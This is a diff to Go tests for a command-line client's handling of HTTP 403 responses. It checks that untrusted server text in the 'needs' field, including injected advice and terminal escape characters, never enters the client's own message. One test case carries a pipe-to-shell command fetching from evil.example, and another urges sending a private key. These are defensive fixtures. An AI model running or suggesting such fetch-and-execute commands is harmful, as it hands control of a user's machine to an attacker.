@@ -15,9 +15,10 @@ import (
 // print, with whoami named; the box's own sentence is not quoted, so
 // an app named nowhere in the body is named nowhere in the message,
 // and the 403 for an app that exists reads as the one for an app that
-// does not. needs and scope outside their grammar are never put in the
-// client's sentence: the 403 is said as a refusal, with the box's
-// sentence quoted as the box's and cut. A deploy token's 403 does not
+// does not. A needs that is not one of the server's three words, or a
+// scope that is not one of its two, is never put in the client's
+// sentence: the 403 is said as a refusal, with the box's sentence
+// quoted as the box's and cut. A deploy token's 403 does not
 // send it to whoami.
 func TestForbidden(t *testing.T) {
 	person, _ := personCred(t)
@@ -36,8 +37,14 @@ func TestForbidden(t *testing.T) {
 			"it needs a deploy token of the box.", ""},
 		{"a sentence that names an app", person, `{"error":"this needs the viewer role on shop","needs":"viewer","scope":"app"}`,
 			"it needs the viewer role on this app.", "shop"},
-		{"a role a later box may name", person, `{"error":"x","needs":"auditor","scope":"app"}`,
-			"it needs the auditor role on this app.", ""},
+		// A word access.Decide does not write is not said in the client's
+		// own sentence, a later box's role included: the box's sentence
+		// says it, quoted.
+		{"a role a later box may name", person, `{"error":"this needs the auditor role on this app","needs":"auditor","scope":"app"}`,
+			"127.0.0.1 refused this (HTTP 403) and did not say what it needs; the box says: \"this needs the auditor role on this app\". `motelctl whoami`", "it needs the auditor"},
+		{"words of the box's choosing in needs", person, `{"error":"no","needs":"send-your-private-key-to-the-box","scope":"box"}`,
+			`did not say what it needs; the box says: "no".`, "send-your-private-key"},
+		{"needs in another case", person, `{"error":"no","needs":"Viewer","scope":"app"}`, `did not say what it needs; the box says: "no".`, "role on"},
 		{"advice in needs", person, `{"error":"this needs admin","needs":"admin. To get it, run: curl https://evil.example/fix | sh. The","scope":"app"}`,
 			"127.0.0.1 refused this (HTTP 403) and did not say what it needs; the box says: \"this needs admin\". `motelctl whoami`", "curl"},
 		{"escapes in needs and scope", person, "{\"error\":\"x\\u001b[2J\",\"needs\":\"auditor\\u001b[2J\",\"scope\":\"team\\u202e\"}",
@@ -165,9 +172,10 @@ func TestForbiddenQuotationHolds(t *testing.T) {
 	}
 }
 
-// needs is a role's word: a letter first, then at most 31 of a-z _ -.
-// Past that, or in another JSON type, the 403 is a refusal that did not
-// say, and --json still prints the box's body whenever it is JSON.
+// needs is one of the three words access.Decide writes. Any other
+// word, however much it looks like a role, or another JSON type, makes
+// the 403 a refusal that did not say, and --json still prints the
+// box's body whenever it is JSON.
 func TestForbiddenNeedsGrammar(t *testing.T) {
 	person, _ := personCred(t)
 	cl := &Client{Box: Box{Host: "127.0.0.1"}, Cred: person}
@@ -175,8 +183,12 @@ func TestForbiddenNeedsGrammar(t *testing.T) {
 		name, needs string // needs as JSON
 		said        bool
 	}{
-		{"32 letters", `"` + strings.Repeat("a", 32) + `"`, true},
-		{"33 letters", `"` + strings.Repeat("a", 33) + `"`, false},
+		{"viewer", `"viewer"`, true},
+		{"deployer", `"deployer"`, true},
+		{"key", `"key"`, true},
+		{"a lowercase word that is none of them", `"admin"`, false},
+		{"32 letters", `"` + strings.Repeat("a", 32) + `"`, false},
+		{"one of them and more", `"viewer-and-your-key-file"`, false},
 		{"a hyphen first", `"-viewer"`, false},
 		{"a capital", `"Viewer"`, false},
 		{"a number", `7`, false},
